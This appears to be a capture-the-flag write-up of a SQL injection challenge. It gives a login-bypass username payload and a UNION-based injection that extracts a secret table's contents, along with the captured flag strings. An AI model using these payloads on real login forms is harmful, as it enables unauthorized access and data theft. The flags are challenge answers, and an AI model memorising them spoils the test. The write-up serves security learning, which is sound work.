# First flag:

Here the query uses a prepared statement for the password

However, the Username is still concatenated as-is

So the input in order to log in as "administrator" should be
username: administrator' OR '' = '
administrator: whatevervalidstring

So we get
FLAG-a1e8c4268f2f673b5df74c953c16969d

# Second flag:
Also, from the source code we notice the following:
// $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.

Let's try the same injection again but with a UNION for retrieving more
information
username:
```sql
' UNION SELECT flag FROM my_secret_table UNION SELECT username FROM users where username = 'administrator' OR ''='
```
We need the last part in order to login and actually display the result
of our newly injected username:

Welcome FLAG-9c4e69e4cfd239d4e16ba0c189f8d643! 
Here's some green text for you.
FLAG-a1e8c4268f2f673b5df74c953c16969d
